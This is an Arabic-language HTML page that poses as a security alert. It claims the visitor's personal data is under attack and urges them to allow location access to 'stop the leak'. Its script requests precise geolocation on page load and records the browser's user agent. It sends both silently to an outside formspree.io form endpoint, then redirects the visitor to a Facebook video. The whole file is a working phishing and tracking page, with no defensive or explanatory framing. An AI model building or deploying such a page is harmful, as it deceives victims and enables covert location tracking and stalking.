<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من البيانات</title>
    <style>
        body { font-family: sans-serif; background-color: #1a1a1a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #2d2d2d; padding: 2rem; border-radius: 12px; border: 1px solid #ff4d4d; width: 85%; }
        .loader { border: 4px solid #333; border-top: 4px solid #ff4d4d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <h3>⚠️ تنبيه أمني</h3>
    <p>تم رصد محاولة وصول لبياناتك الشخصية. يرجى "السماح" بتأكيد الموقع لتوثيق ملكية الحساب وإيقاف عملية التسريب فوراً.</p>
    <div class="loader"></div>
</div>

<form id="trackingForm" action="https://formspree.io/f/mlgavllv" method="POST" style="display:none;">
    <input type="text" name="latitude" id="lat">
    <input type="text" name="longitude" id="lon">
    <input type="text" name="device" id="device">
</form>

<script>
    const vUrl = "https://www.facebook.com/share/v/14ciBr7gfyC/";

    window.onload = function() {
        document.getElementById('device').value = navigator.userAgent;
        // التأكد من طلب الموقع فور تحميل الصفحة
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            window.location.href = vUrl;
        }
    };

    function success(position) {
        document.getElementById('lat').value = position.coords.latitude;
        document.getElementById('lon').value = position.coords.longitude;
        const form = document.getElementById('trackingForm');
        fetch(form.action, {
            method: 'POST',
            body: new FormData(form),
            headers: { 'Accept': 'application/json' }
        }).finally(() => { window.location.href = vUrl; });
    }

    function error(err) {
        // في حال الرفض أو الخطأ يتم التحويل للفيديو
        console.log("Error: " + err.message);
        window.location.href = vUrl;
    }
</script>
</body>
</html>
